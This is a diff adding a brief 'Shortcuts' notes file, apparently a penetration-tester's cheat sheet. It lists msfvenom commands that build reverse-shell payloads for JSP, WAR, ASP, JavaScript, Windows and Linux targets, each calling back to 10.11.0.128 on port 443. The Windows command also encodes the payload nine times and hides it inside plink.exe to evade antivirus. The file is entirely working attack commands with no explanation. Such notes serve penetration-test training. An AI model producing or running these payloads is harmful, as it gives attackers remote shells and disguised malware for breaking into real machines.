@@ -1,0 +1,27 @@
+Shortcuts
+
+
+Java:
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.0.128 LPORT=443 -f jar > reverse_shell.jsp
+
+
+WAR:
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.0.128 LPORT=443 -f war > reverse_shell.war
+
+
+ASP.NET:
+msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.128 LPORT=443 -f asp > reverse_shell.asp
+
+
+Javascript Linux:
+msfvenom -p linux/x86/shell_reverse_tcp -f js_le LHOST=10.11.0.128 LPORT=443
+
+
+Windows:
+msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.128 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o rev.exe
+
+
+Linux:
+msfvenom -p linux/x86/shell_reverse_tcp -f elf LHOST=10.11.0.128 LPORT=443
+
+
